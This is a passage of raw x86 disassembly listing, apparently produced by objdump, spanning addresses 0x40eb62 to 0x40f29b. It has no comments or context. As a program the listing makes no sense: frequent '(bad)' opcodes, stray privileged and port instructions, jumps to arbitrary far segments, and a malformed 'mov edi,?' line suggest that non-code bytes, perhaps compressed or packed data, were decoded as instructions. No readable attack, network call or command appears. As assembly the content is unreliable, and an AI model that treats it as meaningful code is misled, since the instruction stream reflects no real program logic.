  40eb62:	xchg   ecx,eax
  40eb63:	std    
  40eb64:	pop    esp
  40eb65:	push   ebx
  40eb66:	pop    esi
  40eb67:	inc    ebx
  40eb68:	add    DWORD PTR [edx-0x2a07dd44],0xffffffae
  40eb6f:	je     0x40eb75
  40eb71:	loope  0x40eba3
  40eb73:	outs   dx,BYTE PTR ds:[esi]
  40eb74:	mov    bl,0x62
  40eb76:	cmp    cl,BYTE PTR [esi]
  40eb78:	mov    eax,0xdfce636a
  40eb7d:	jne    0x40ebe4
  40eb7f:	frstor [ecx+0x1f]
  40eb82:	mov    ch,0xfc
  40eb84:	jp     0x40eb17
  40eb86:	aas    
  40eb87:	adc    al,0x3b
  40eb89:	cdq    
  40eb8a:	push   esi
  40eb8b:	mov    dh,0x6a
  40eb8d:	adc    BYTE PTR [ecx+ebx*1+0x3f],dl
  40eb91:	pop    esi
  40eb92:	xchg   ecx,eax
  40eb93:	pop    es
  40eb94:	(bad)  
  40eb95:	fistp  QWORD PTR [esi]
  40eb97:	ds mov dl,bh
  40eb9a:	aad    0x57
  40eb9c:	in     eax,dx
  40eb9d:	mov    esp,cs
  40eb9f:	popa   
  40eba0:	push   ds
  40eba1:	int    0x3b
  40eba3:	leave  
  40eba4:	sbb    dl,BYTE PTR [ecx+0x73fd5f9d]
  40ebaa:	leave  
  40ebab:	cmp    cl,0xce
  40ebae:	dec    esi
  40ebaf:	mov    eax,ds:0x8890297d
  40ebb4:	mov    edi,0xbea22ec2
  40ebb9:	addr16 jle 0x40ebfc
  40ebbc:	rcl    bh,0x3b
  40ebbf:	mov    ch,0x89
  40ebc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebc2:	iret   
  40ebc3:	shr    BYTE PTR es:[ebp-0x74e8727c],cl
  40ebca:	and    bh,BYTE PTR [ebp+ebx*2-0x7f]
  40ebce:	dec    edx
  40ebcf:	out    dx,al
  40ebd0:	sub    ch,BYTE PTR [edi+0x1d]
  40ebd3:	popf   
  40ebd4:	push   edx
  40ebd5:	out    dx,al
  40ebd6:	imul   edx,DWORD PTR [ecx+0x2adaecd],0xffffffe5
  40ebdd:	leave  
  40ebde:	mov    bh,0x4c
  40ebe0:	hlt    
  40ebe1:	jo     0x40ec00
  40ebe3:	addr16 enter 0x2768,0xc2
  40ebe8:	add    ebp,DWORD PTR [ebx+0x5187ca18]
  40ebee:	xor    ebx,DWORD PTR [esi+0x31]
  40ebf1:	push   cs
  40ebf2:	das    
  40ebf3:	hlt    
  40ebf4:	jle    0x40ec5b
  40ebf6:	push   ds
  40ebf7:	jno    0x40ebb8
  40ebf9:	inc    ebp
  40ebfa:	loope  0x40ebca
  40ebfc:	and    al,0x75
  40ebfe:	jae    0x40ec17
  40ec00:	loope  0x40ebce
  40ec02:	dec    ebx
  40ec03:	aad    0xfc
  40ec05:	dec    edi
  40ec06:	cmp    DWORD PTR [eax+0x484bfc21],eax
  40ec0c:	jo     0x40ec47
  40ec0e:	(bad)  
  40ec0f:	push   edx
  40ec10:	cmp    al,0xfa
  40ec12:	retf   
  40ec13:	or     eax,0x1c824355
  40ec18:	lahf   
  40ec19:	cmp    BYTE PTR [edx-0x43a81bd3],dh
  40ec1f:	int    0xf6
  40ec21:	fucom  st(7)
  40ec23:	dec    ecx
  40ec24:	mov    bl,0x97
  40ec26:	fiadd  DWORD PTR [esi-0x42]
  40ec29:	inc    edi
  40ec2a:	mov    dh,0x61
  40ec2c:	(bad)
  40ec2f:	jmp    0x5abe:0x33b19e0d
  40ec36:	fidivr WORD PTR [ebx]
  40ec38:	pop    ecx
  40ec39:	adc    al,0x2f
  40ec3c:	push   ecx
  40ec3d:	fwait
  40ec3e:	push   0xffffff9f
  40ec40:	add    eax,0x9212b707
  40ec45:	hlt    
  40ec46:	xor    al,0x5d
  40ec48:	lods   al,BYTE PTR ds:[esi]
  40ec49:	mov    ch,0x46
  40ec4b:	cmp    al,0x5c
  40ec4d:	loope  0x40ec75
  40ec4f:	or     al,0xb4
  40ec51:	addr16 pop edi
  40ec53:	jmp    0x76a75e0d
  40ec58:	add    al,0xe7
  40ec5a:	hlt    
  40ec5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec5c:	push   ebx
  40ec5d:	mov    al,0x4e
  40ec5f:	pop    esp
  40ec60:	fucompp 
  40ec62:	test   DWORD PTR [ebp+0x20],edx
  40ec65:	jae    0x40ec9a
  40ec67:	neg    DWORD PTR [ebx-0x538da842]
  40ec6d:	call   0xbbde:0x759ff9b9
  40ec74:	mov    cl,0x91
  40ec76:	shl    BYTE PTR [esi+0x4c],cl
  40ec79:	les    ecx,FWORD PTR [edi]
  40ec7b:	push   eax
  40ec7c:	jmp    0x40ec2c
  40ec7e:	cdq    
  40ec7f:	mov    eax,0x3025af1f
  40ec84:	mov    ss,WORD PTR [ecx]
  40ec86:	cdq    
  40ec87:	inc    ecx
  40ec88:	and    eax,0x16336ba1
  40ec8d:	lock xchg BYTE PTR [ebp-0x52],ch
  40ec91:	clc    
  40ec92:	or     DWORD PTR [eax+0x6e68840d],ebp
  40ec98:	outs   dx,BYTE PTR ds:[esi]
  40ec99:	das    
  40ec9a:	das    
  40ec9b:	adc    edi,edx
  40ec9d:	or     al,0x26
  40ec9f:	mov    dh,0x70
  40eca1:	int    0x5f
  40eca3:	cmp    bl,BYTE PTR [ebx-0x62]
  40eca6:	and    eax,0x1e010266
  40ecab:	je     0x40ec81
  40ecad:	outs   dx,DWORD PTR ds:[esi]
  40ecae:	fdiv   st(6),st
  40ecb0:	retf   0x46f6
  40ecb3:	lea    edx,[ebx]
  40ecb5:	fidivr WORD PTR [ecx+0xa]
  40ecb8:	and    al,0xdb
  40ecba:	add    bh,BYTE PTR [ecx+0x2d]
  40ecbd:	aas    
  40ecbe:	out    dx,eax
  40ecbf:	lahf   
  40ecc0:	test   DWORD PTR [eax+ebx*8+0x2b],edx
  40ecc4:	mov    ebp,0x96783fc0
  40ecc9:	adc    esi,DWORD PTR [eax]
  40eccb:	cmp    eax,DWORD PTR [eax-0x3fe94914]
  40ecd1:	pop    eax
  40ecd2:	into   
  40ecd3:	mov    eax,0xc148c42d
  40ecd8:	xchg   esp,eax
  40ecd9:	jecxz  0x40eca2
  40ecdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecdc:	loop   0x40ed10
  40ecde:	aad    0xb2
  40ece0:	and    al,0x8c
  40ece2:	sahf   
  40ece3:	int    0xf3
  40ece5:	jg     0x40ecfd
  40ece7:	push   es
  40ece8:	sbb    dl,BYTE PTR [edx]
  40ecea:	xor    DWORD PTR [ebx+0x1e4be058],edx
  40ecf0:	bound  ebx,QWORD PTR [ecx]
  40ecf2:	jne    0x40ed19
  40ecf4:	push   0x3d950c90
  40ecf9:	jg     0x40ec85
  40ecfb:	pop    esp
  40ecfc:	out    0x22,eax
  40ecfe:	fldenv [ecx]
  40ed00:	aas    
  40ed01:	stc    
  40ed02:	and    eax,0xb2a992c2
  40ed07:	and    ecx,DWORD PTR [esi]
  40ed09:	push   eax
  40ed0a:	ret    0xb777
  40ed0d:	jg     0x40ed1c
  40ed0f:	push   esp
  40ed10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed11:	push   edx
  40ed12:	pop    esp
  40ed13:	jo     0x40ed64
  40ed15:	sub    DWORD PTR [ebx+0x22d4e1e8],edi
  40ed1b:	xor    BYTE PTR [eax],bl
  40ed1d:	sub    eax,0x68b21d91
  40ed22:	gs hlt 
  40ed24:	push   ds
  40ed25:	enter  0x8038,0x3b
  40ed29:	stc    
  40ed2a:	out    0x99,al
  40ed2c:	mov    bh,0x38
  40ed2e:	scas   al,BYTE PTR es:[edi]
  40ed2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed30:	xor    bh,bl
  40ed32:	pop    es
  40ed33:	sbb    al,0xf3
  40ed35:	sub    DWORD PTR [esi-0x77],edi
  40ed38:	push   ecx
  40ed39:	push   ss
  40ed3a:	pop    ecx
  40ed3b:	sahf   
  40ed3c:	mov    eax,0xd3fe2397
  40ed41:	sub    eax,0xebc3ac06
  40ed46:	test   al,0x1
  40ed48:	add    al,BYTE PTR ds:0x70ed8a5f
  40ed4e:	scas   eax,DWORD PTR es:[edi]
  40ed4f:	add    bl,BYTE PTR [edx+0x35]
  40ed52:	pop    ds
  40ed53:	adc    DWORD PTR [eax-0x2f],ebp
  40ed56:	add    DWORD PTR [edi+ecx*4],eax
  40ed59:	mov    cl,0x52
  40ed5b:	imul   edi,DWORD PTR ds:0xcbfc50a3,0xec1161e6
  40ed65:	fcmovnbe st,st(5)
  40ed67:	out    dx,eax
  40ed68:	xchg   ecx,eax
  40ed69:	or     esi,DWORD PTR [esi]
  40ed6b:	add    eax,0xf41eed95
  40ed70:	xor    ebp,DWORD PTR ds:0xb7da8faf
  40ed76:	lods   eax,DWORD PTR ds:[esi]
  40ed77:	dec    edi
  40ed78:	xchg   esp,eax
  40ed7a:	stos   DWORD PTR es:[edi],eax
  40ed7b:	adc    edi,DWORD PTR [eax]
  40ed7d:	push   cs
  40ed7e:	push   edi
  40ed7f:	mov    ebp,0xf8873a98
  40ed84:	dec    ebp
  40ed85:	push   edi
  40ed86:	jg     0x40ed48
  40ed88:	jo     0x40ed1a
  40ed8a:	ins    BYTE PTR es:[edi],dx
  40ed8b:	cmp    DWORD PTR [ebp+0x7bd674fb],ecx
  40ed91:	popf   
  40ed92:	out    0x9b,al
  40ed94:	retf   
  40ed95:	pop    es
  40ed96:	mov    bh,0x81
  40ed98:	retf   
  40ed99:	push   ebx
  40ed9a:	sbb    BYTE PTR [edi+0x36],al
  40ed9d:	pushf  
  40ed9e:	test   esp,esi
  40eda0:	and    bh,BYTE PTR [eax+edx*2-0x21]
  40eda4:	mov    ds:0x2f4ce5d2,eax
  40eda9:	jg     0x40edb6
  40edab:	push   ecx
  40edac:	or     al,0x28
  40edae:	ret    
  40edaf:	pop    ebp
  40edb0:	pop    esi
  40edb1:	sub    eax,0x9a4b415b
  40edb6:	xchg   DWORD PTR [esi-0x5e],ecx
  40edb9:	dec    edx
  40edba:	pop    ebp
  40edbb:	dec    eax
  40edbc:	push   0x77
  40edbe:	inc    ebx
  40edbf:	call   esp
  40edc1:	or     DWORD PTR [edx],ecx
  40edc3:	xchg   BYTE PTR [eax],ah
  40edc5:	jecxz  0x40ed9d
  40edc7:	outs   dx,DWORD PTR ds:[esi]
  40edc8:	xchg   ecx,eax
  40edc9:	dec    esi
  40edca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edcb:	mov    ds:0xf521e1c,al
  40edd0:	push   ebx
  40edd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edd2:	pushf  
  40edd3:	sbb    al,BYTE PTR [edi]
  40edd5:	mov    bh,0xe7
  40edd7:	jmp    0xa79c:0xfa72ad09
  40edde:	mov    eax,0xb3792023
  40ede3:	fisttp WORD PTR fs:0xe978677
  40edea:	cdq    
  40edeb:	jle    0x40edc8
  40eded:	adc    eax,DWORD PTR [ecx+edi*2-0x2f]
  40edf1:	bound  esp,QWORD PTR [edi+0x30]
  40edf4:	cmp    eax,0x438f3c07
  40edf9:	sub    dh,BYTE PTR [edx]
  40edfb:	popa   
  40edfc:	and    eax,0x4ba9874a
  40ee01:	inc    ecx
  40ee02:	inc    ecx
  40ee03:	mov    ds:0x58ccd0db,al
  40ee08:	sahf   
  40ee09:	gs ins DWORD PTR es:[edi],dx
  40ee0b:	xor    eax,DWORD PTR [edi]
  40ee0d:	adc    BYTE PTR [edi-0x3bd2be43],dl
  40ee13:	xor    al,0xc9
  40ee15:	xchg   BYTE PTR [ebx],dl
  40ee17:	cs xchg ecx,eax
  40ee19:	pop    es
  40ee1a:	hlt    
  40ee1b:	nop
  40ee1c:	imul   eax,DWORD PTR [ebp*1-0x243683e4],0xdd140ee8
  40ee27:	ins    DWORD PTR es:[edi],dx
  40ee28:	mov    ch,0x3
  40ee2a:	jbe    0x40ee86
  40ee2c:	repnz into 
  40ee2e:	mov    ds:0x9d6d0333,al
  40ee33:	push   esp
  40ee34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee35:	clc    
  40ee36:	int3   
  40ee37:	mov    bh,0x62
  40ee39:	jno    0x40edf7
  40ee3b:	imul   eax,ecx,0x38de2221
  40ee41:	ins    DWORD PTR es:[edi],dx
  40ee42:	out    dx,al
  40ee43:	int    0x7f
  40ee45:	sar    BYTE PTR [ecx+0x7ad6c81b],cl
  40ee4b:	arpl   WORD PTR [ebp+0x4b132705],ax
  40ee51:	cmc    
  40ee52:	push   eax
  40ee53:	and    al,0x93
  40ee55:	jmp    0xf6429b33
  40ee5a:	mov    ebp,0xd6cb3107
  40ee5f:	pusha  
  40ee60:	ins    DWORD PTR es:[edi],dx
  40ee61:	ja     0x40eeca
  40ee63:	cmp    DWORD PTR [ebx+0x5bcb4ace],0x67
  40ee6a:	jge    0x40ee0e
  40ee6c:	jmp    0x4db17096
  40ee71:	cs mov ecx,0x8b1a70b1
  40ee77:	aad    0x9f
  40ee79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee7a:	and    eax,0x67108c31
  40ee7f:	test   DWORD PTR [ecx-0xadf300],esp
  40ee85:	mov    dl,0xc6
  40ee87:	lds    edx,FWORD PTR [ecx+0x58f3153]
  40ee8d:	ja     0x40eedb
  40ee8f:	into   
  40ee90:	push   ebp
  40ee91:	sahf   
  40ee92:	shl    DWORD PTR [eax+0x5e],1
  40ee95:	cdq    
  40ee96:	repz xor eax,ebp
  40ee99:	les    ecx,FWORD PTR [esi]
  40ee9b:	lods   al,BYTE PTR ds:[esi]
  40ee9c:	push   es
  40ee9d:	ja     0x40ef11
  40ee9f:	mov    edx,0x4e69a0ee
  40eea4:	retf   
  40eea5:	retf   
  40eea6:	stos   BYTE PTR es:[edi],al
  40eea7:	mov    dl,0x9e
  40eea9:	xchg   ecx,eax
  40eeaa:	shl    DWORD PTR [edi-0x5fc1cb2d],0xfb
  40eeb1:	(bad)  
  40eeb3:	sub    cl,BYTE PTR [esi]
  40eeb5:	sahf   
  40eeb6:	rcl    DWORD PTR [eax],0xab
  40eeb9:	mov    ds:0x68834d4f,eax
  40eebe:	and    al,0x1
  40eec0:	push   ebp
  40eec1:	outs   dx,DWORD PTR ds:[esi]
  40eec2:	pop    ds
  40eec3:	mov    bh,0x2
  40eec5:	xor    esi,ecx
  40eec7:	xchg   ebx,eax
  40eec8:	cmp    eax,0x8d493eec
  40eecd:	aam    0x3e
  40eecf:	clc    
  40eed0:	(bad)  
  40eed1:	and    al,0xbd
  40eed3:	clc    
  40eed4:	jg     0x40ee58
  40eed6:	push   ss
  40eed7:	and    BYTE PTR [ecx+0x501192c7],ch
  40eedd:	fadd   st(7),st
  40eedf:	icebp  
  40eee0:	rol    DWORD PTR [esi],0xa5
  40eee3:	dec    edx
  40eee4:	stos   BYTE PTR es:[edi],al
  40eee5:	pop    ebx
  40eee6:	xchg   ebp,eax
  40eee7:	push   esi
  40eee8:	std    
  40eee9:	and    BYTE PTR ds:0x13df2aba,ch
  40eeef:	inc    esi
  40eef0:	aas    
  40eef1:	fwait
  40eef2:	loopne 0x40eee8
  40eef4:	ror    BYTE PTR [esi+0x29a00c0],cl
  40eefa:	sub    eax,0xa58efdf2
  40eeff:	cmp    BYTE PTR [esi*4+0x2cda7170],ch
  40ef06:	sub    BYTE PTR [ecx],ch
  40ef08:	push   ss
  40ef09:	inc    edi
  40ef0a:	dec    esp
  40ef0b:	fsubr  QWORD PTR [ebx+0x58378088]
  40ef11:	add    al,0xff
  40ef13:	or     BYTE PTR [eax+ebx*1-0x1bb4e17],0x52
  40ef1b:	and    al,0x56
  40ef1d:	adc    DWORD PTR [ebx+esi*1-0x3b],edi
  40ef21:	std    
  40ef22:	pushf  
  40ef23:	les    ebp,FWORD PTR [ebp-0x1]
  40ef26:	fst    st(3)
  40ef28:	out    0x37,eax
  40ef2a:	ins    BYTE PTR es:[edi],dx
  40ef2b:	or     DWORD PTR [ebx+ebx*8+0x6b172235],esp
  40ef32:	push   esi
  40ef33:	mov    esi,0x8070c005
  40ef38:	xor    ch,BYTE PTR [edx-0x649e1768]
  40ef3e:	ss xchg edi,eax
  40ef40:	mov    esp,0x343aaaa5
  40ef45:	sbb    ah,bl
  40ef47:	sub    DWORD PTR [ebx+ebp*2+0x63],0x30
  40ef4c:	xchg   esi,eax
  40ef4d:	es add al,0xd1
  40ef50:	stc    
  40ef51:	les    esi,FWORD PTR [ebx]
  40ef53:	int    0x30
  40ef55:	push   esp
  40ef56:	xchg   edi,eax
  40ef57:	or     eax,0x62107713
  40ef5c:	or     al,0x26
  40ef5e:	xchg   BYTE PTR [ebx],cl
  40ef60:	xor    esi,DWORD PTR [edx+0x10]
  40ef63:	es adc edi,eax
  40ef66:	inc    esp
  40ef67:	push   edi
  40ef68:	jnp    0x40ef51
  40ef6a:	arpl   WORD PTR [eax+0x7d9f1f0],dx
  40ef70:	pop    edx
  40ef71:	push   ss
  40ef72:	jne    0x40efb3
  40ef74:	mov    bh,0xe7
  40ef76:	xlat   BYTE PTR ds:[ebx]
  40ef77:	cmp    al,0x7e
  40ef79:	mov    BYTE PTR [ebp-0x50],al
  40ef7c:	int3   
  40ef7d:	add    eax,DWORD PTR [ebx+0x66]
  40ef80:	pop    esi
  40ef81:	dec    ecx
  40ef82:	bound  esp,QWORD PTR [edi]
  40ef84:	fwait
  40ef85:	iret   
  40ef86:	cld    
  40ef87:	jp     0x40ef60
  40ef89:	retf   0x281f
  40ef8c:	faddp  st(1),st
  40ef8e:	dec    edi
  40ef8f:	popa   
  40ef90:	mov    ecx,DWORD PTR [edi-0x37]
  40ef93:	jge    0x40efb7
  40ef95:	fwait
  40ef96:	jo     0x40ef20
  40ef98:	sahf   
  40ef99:	add    bl,BYTE PTR [ebx-0x7388a559]
  40ef9f:	mov    bl,0x8b
  40efa1:	sahf   
  40efa2:	jmp    0x40efe1
  40efa4:	inc    eax
  40efa5:	pop    ebp
  40efa6:	fidivr WORD PTR [edi+0x68]
  40efa9:	dec    ecx
  40efaa:	rol    DWORD PTR [ebx+0x33d72aea],0x89
  40efb1:	lahf   
  40efb2:	adc    edx,eax
  40efb4:	clc    
  40efb5:	sub    DWORD PTR [esi+edi*2-0x9],ebp
  40efb9:	mov    ebx,0xee095a37
  40efbe:	sti    
  40efbf:	lds    ebp,FWORD PTR [esi-0x51]
  40efc2:	xor    DWORD PTR [ebx],esp
  40efc4:	xchg   esp,eax
  40efc5:	xchg   ah,bh
  40efc7:	test   BYTE PTR [ebp+0x7536309c],al
  40efcd:	add    esp,DWORD PTR [esi]
  40efcf:	mov    BYTE PTR ds:[eax],al
  40efd2:	push   edi
  40efd3:	jmp    0x40f046
  40efd5:	mov    ebx,0x58d0e416
  40efda:	nop
  40efdb:	rcr    BYTE PTR [edx+0x33],0xfc
  40efdf:	adc    al,BYTE PTR [ecx+0x11a4b732]
  40efe5:	push   ebx
  40efe6:	lahf   
  40efe7:	inc    esp
  40efe8:	outs   dx,BYTE PTR ds:[esi]
  40efe9:	pop    esi
  40efea:	mov    bl,0x5d
  40efec:	inc    edx
  40efed:	pop    esi
  40efee:	pop    ebp
  40efef:	mov    ecx,0xb1c15813
  40eff4:	enter  0x7102,0xc0
  40eff8:	outs   dx,DWORD PTR ds:[esi]
  40eff9:	retf   0x83c5
  40effc:	mov    eax,ds:0x8fc9bc77
  40f001:	jmp    0x40f053
  40f003:	xor    dh,BYTE PTR [ebx-0x115a52ed]
  40f009:	cli    
  40f00a:	lds    ecx,FWORD PTR [edi]
  40f00c:	fldcw  WORD PTR [ecx]
  40f00e:	or     al,BYTE PTR [eax-0x50f0a553]
  40f014:	jbe    0x40efc4
  40f016:	cs cs mov ebx,0xd9922401
  40f01d:	out    0x4c,eax
  40f01f:	(bad)  
  40f020:	retf   
  40f021:	pusha  
  40f022:	xor    BYTE PTR [eax+0x7],0x8d
  40f026:	out    dx,eax
  40f027:	mov    ebx,0xe1a3736e
  40f02c:	int3   
  40f02d:	mov    BYTE PTR [edx+ecx*1-0x313df730],bl
  40f034:	mov    dl,0x9c
  40f036:	mov    ecx,0xf6e75f35
  40f03b:	outs   dx,DWORD PTR ds:[esi]
  40f03c:	test   BYTE PTR [eax+0x36817bb7],ch
  40f042:	pop    edx
  40f043:	icebp  
  40f044:	outs   dx,DWORD PTR ds:[esi]
  40f045:	inc    eax
  40f046:	pop    ebx
  40f047:	dec    edi
  40f048:	xchg   esi,eax
  40f049:	fscale 
  40f04b:	mov    ch,bh
  40f04d:	mov    bh,0xbf
  40f04f:	dec    ebx
  40f050:	imul   DWORD PTR [eax]
  40f052:	xchg   BYTE PTR [eax+ecx*4],al
  40f055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f056:	xchg   edi,eax
  40f057:	add    DWORD PTR [edi],esi
  40f059:	pop    ebp
  40f05a:	into   
  40f05b:	push   esi
  40f05c:	popa   
  40f05d:	daa    
  40f05e:	and    al,0x61
  40f060:	lahf   
  40f061:	xchg   ebp,eax
  40f062:	mov    BYTE PTR [ebx-0x335f804e],ch
  40f068:	shl    BYTE PTR [ebp-0x27],1
  40f06b:	ret    0x9a5a
  40f06e:	(bad)  
  40f06f:	jle    0x40f077
  40f071:	xchg   ebp,eax
  40f072:	cmp    ecx,DWORD PTR [edi+0x79]
  40f075:	mov    bh,0x2
  40f077:	loopne 0x40f0a9
  40f079:	aam    0x6d
  40f07b:	inc    edi
  40f07c:	or     al,0x30
  40f07e:	int    0xad
  40f080:	int    0x73
  40f082:	ds push edx
  40f084:	sub    ah,BYTE PTR [edx+0x4f]
  40f087:	dec    ecx
  40f088:	or     ah,BYTE PTR [ebx-0x54bd6e1]
  40f08e:	nop    esi
  40f091:	push   edi
  40f092:	dec    edx
  40f093:	cmp    al,0xf3
  40f095:	pop    ecx
  40f096:	popf   
  40f097:	inc    esi
  40f098:	adc    bx,WORD PTR [esi+0x18ad97a7]
  40f09f:	es sub eax,0xa66c161d
  40f0a5:	adc    DWORD PTR [edi],ebx
  40f0a7:	mov    edx,0x1b220f61
  40f0ac:	ss push 0xffffff92
  40f0af:	and    edi,esp
  40f0b1:	aaa    
  40f0b2:	add    DWORD PTR [esi],eax
  40f0b4:	sbb    esp,DWORD PTR ds:0xa3102540
  40f0ba:	xchg   ebp,eax
  40f0bb:	lds    edx,FWORD PTR [edi-0x22]
  40f0be:	jmp    0x40f106
  40f0c0:	repz lock ss jmp 0x299a:0x8840f6d4
  40f0ca:	inc    ecx
  40f0cb:	xor    eax,0xef0d3164
  40f0d0:	jnp    0x40f0f9
  40f0d2:	adc    ch,BYTE PTR [ebp+0x1a780c47]
  40f0d8:	cmp    eax,0x760d382b
  40f0dd:	(bad)  
  40f0de:	mov    dh,ch
  40f0e0:	sti    
  40f0e1:	push   esi
  40f0e2:	std    
  40f0e3:	adc    DWORD PTR [ebx+ebx*2-0x54ac5a41],eax
  40f0ea:	xor    dh,BYTE PTR [ebx-0x21]
  40f0ed:	pop    eax
  40f0ee:	(bad)  
  40f0ef:	mov    edx,0xc79a3e0f
  40f0f4:	and    ecx,DWORD PTR [ebx+0x3e]
  40f0f7:	inc    edi
  40f0f8:	cmc    
  40f0f9:	mov    eax,fs:0xc2488a7c
  40f0ff:	jmp    0x64ca6a72
  40f104:	ins    BYTE PTR es:[edi],dx
  40f105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f106:	sahf   
  40f107:	rol    BYTE PTR ds:0x89e587d7,1
  40f10d:	hlt    
  40f10e:	jmp    0x4f8bd538
  40f113:	dec    edi
  40f114:	dec    edx
  40f115:	dec    ebx
  40f116:	fadd   DWORD PTR [ecx+0x16]
  40f119:	imul   ebp,DWORD PTR [edi+0x6d0f6fbd],0x1f3c7fb8
  40f123:	dec    esi
  40f124:	pop    edx
  40f125:	(bad)  
  40f127:	stc    
  40f128:	sbb    al,0x8d
  40f12a:	(bad)  
  40f12b:	out    0xa5,al
  40f12d:	push   esp
  40f12e:	les    eax,FWORD PTR [ecx-0x2d1657b8]
  40f134:	mov    DWORD PTR [edx+0x3b],ecx
  40f137:	adc    al,BYTE PTR [ebp+0x50]
  40f13a:	in     eax,dx
  40f13b:	rcl    DWORD PTR [ecx-0x18],0x8b
  40f13f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f140:	loope  0x40f1bf
  40f142:	adc    ah,BYTE PTR [ecx+0x37f81233]
  40f148:	dec    ecx
  40f149:	ins    BYTE PTR es:[edi],dx
  40f14a:	shl    DWORD PTR [edi],cl
  40f14c:	stos   BYTE PTR es:[edi],al
  40f14d:	popf   
  40f14e:	inc    esi
  40f14f:	or     dh,ch
  40f151:	adc    eax,0xf64b2912
  40f156:	or     ah,dh
  40f158:	push   edx
  40f159:	imul   edi,ebx,0xfffffff8
  40f15c:	xchg   edx,eax
  40f15d:	dec    edx
  40f15e:	ins    BYTE PTR es:[edi],dx
  40f15f:	les    edx,FWORD PTR [edx]
  40f161:	pop    edi
  40f162:	sbb    bl,dh
  40f164:	push   0xffffffa1
  40f166:	mov    esp,0xa8199053
  40f16b:	and    al,0x28
  40f16d:	mov    bl,0xe3
  40f16f:	pop    ss
  40f170:	fisub  WORD PTR [ecx-0x68]
  40f173:	mov    edx,0x8709fba2
  40f178:	daa    
  40f179:	mov    ebx,0x478e8dbc
  40f17e:	outs   dx,DWORD PTR ds:[esi]
  40f17f:	mov    dh,0x4e
  40f181:	das    
  40f182:	push   ss
  40f183:	sbb    bl,BYTE PTR [edx]
  40f185:	push   es
  40f186:	xor    dl,al
  40f188:	into   
  40f189:	imul   eax,edi,0x12
  40f18c:	in     al,0x57
  40f18e:	sub    bh,dh
  40f190:	ret    
  40f191:	mov    ds:0x29aad96b,al
  40f196:	push   ebx
  40f197:	inc    ebp
  40f198:	or     BYTE PTR [edi],dh
  40f19a:	inc    esi
  40f19b:	retf   
  40f19c:	jg     0x40f151
  40f19e:	or     BYTE PTR [edi-0x6],0x13
  40f1a2:	push   ebx
  40f1a3:	iret   
  40f1a4:	fisttp QWORD PTR [ebp-0x3d913762]
  40f1aa:	shr    DWORD PTR [edi+0x4a],1
  40f1ad:	sub    eax,0x259e4169
  40f1b2:	sbb    BYTE PTR [eax+0x725b63e4],0x68
  40f1b9:	xor    eax,0x1c5bab28
  40f1be:	mov    ah,0x99
  40f1c0:	bound  esi,QWORD PTR [edx+0x4070ecd1]
  40f1c6:	mov    ds,WORD PTR [eax]
  40f1c8:	ret    0x5a12
  40f1cb:	push   ebx
  40f1cc:	jle    0x40f179
  40f1ce:	push   esp
  40f1cf:	out    0x28,al
  40f1d1:	and    al,0x8c
  40f1d3:	dec    eax
  40f1d4:	or     ch,al
  40f1d6:	xor    BYTE PTR [esi+edx*2+0x60],dh
  40f1da:	sub    BYTE PTR [ecx-0x31],dh
  40f1dd:	push   eax
  40f1de:	jle    0x40f227
  40f1e0:	shl    ebp,cl
  40f1e2:	adc    eax,0x32a064ec
  40f1e7:	pop    eax
  40f1e8:	mov    edi,?
  40f1ea:	cmp    BYTE PTR [edi-0x76],cl
  40f1ed:	pmulhuw mm3,mm1
  40f1f0:	mov    ebp,0x10ac0aa5
  40f1f5:	mov    ecx,0xb5e34a7d
  40f1fa:	adc    cl,BYTE PTR [edx-0xc]
  40f1fd:	test   ebp,ebx
  40f1ff:	push   0xde1e43e1
  40f204:	jg     0x40f18a
  40f206:	and    DWORD PTR [esp+esi*1+0x7678fc66],0xaa8ea9af
  40f211:	call   0xa1261006
  40f216:	(bad)
  40f219:	pushf  
  40f21a:	cs mov ch,0xdf
  40f21d:	popa   
  40f21e:	jle    0x40f296
  40f220:	xchg   ecx,eax
  40f221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f222:	retf   0xc189
  40f225:	aam    0x25
  40f227:	xchg   BYTE PTR [edi],bh
  40f229:	stc    
  40f22a:	imul   ebx,DWORD PTR [edi-0x31],0xffffffe9
  40f22e:	(bad)
  40f232:	fwait
  40f233:	xchg   esi,eax
  40f234:	xlat   BYTE PTR ds:[ebx]
  40f235:	ins    DWORD PTR es:[edi],dx
  40f236:	mov    BYTE PTR [ebp-0x9d7cce4],ah
  40f23c:	push   0xffffffe0
  40f23e:	adc    DWORD PTR [edi+edx*8],edi
  40f241:	jge    0x40f1ec
  40f243:	pusha  
  40f244:	stos   BYTE PTR es:[edi],al
  40f245:	xchg   ecx,eax
  40f246:	sahf   
  40f247:	pop    ss
  40f248:	test   al,0x77
  40f24a:	es ins DWORD PTR es:[edi],dx
  40f24c:	jb     0x40f233
  40f24e:	inc    esi
  40f24f:	and    DWORD PTR [ebp+0x47],0xffffffe0
  40f253:	jmp    0xd160:0x94e74719
  40f25a:	inc    ecx
  40f25b:	pop    esi
  40f25c:	adc    eax,0x4bc2694d
  40f261:	xchg   ebx,eax
  40f262:	add    BYTE PTR [ebx],al
  40f264:	xor    cx,WORD PTR [edi+0x2f349aaf]
  40f26b:	mov    edx,0x324f04e3
  40f270:	add    ebx,DWORD PTR [ebp+edi*2-0x7170114d]
  40f277:	xchg   ecx,eax
  40f278:	push   esp
  40f279:	mov    esi,0x764b1970
  40f27e:	(bad)  
  40f27f:	xor    eax,0xe98be711
  40f284:	pop    ecx
  40f285:	out    0x20,eax
  40f287:	and    DWORD PTR [ebx],edi
  40f289:	xchg   BYTE PTR [ebx+0x51357d5e],ch
  40f28f:	out    0x4a,al
  40f291:	adc    dh,BYTE PTR [eax+0x396eeed4]
  40f297:	and    DWORD PTR [ebx],esi
  40f299:	jle    0x40f2d3
  40f29b:	jno    0x40f236
